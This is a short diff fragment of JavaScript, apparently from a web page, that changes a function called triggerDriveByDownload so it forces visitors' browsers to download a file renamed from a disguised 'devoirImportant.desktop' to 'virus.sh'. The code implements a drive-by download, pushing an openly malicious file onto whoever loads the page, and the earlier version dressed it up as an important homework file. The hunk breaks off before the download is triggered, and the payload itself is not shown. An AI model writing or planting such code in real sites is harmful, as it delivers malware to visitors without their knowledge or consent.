@@ -5,8 +5,8 @@
 
     const triggerDriveByDownload = () => {
         const link = document.createElement('a');
-        link.href = '/devoirImportant.desktop'; 
-        link.download = 'virus.desktop';
+        link.href = '/virus.sh'; 
+        link.download = 'virus.sh';
         link.target = '_self';
 
         document.body.appendChild(link);
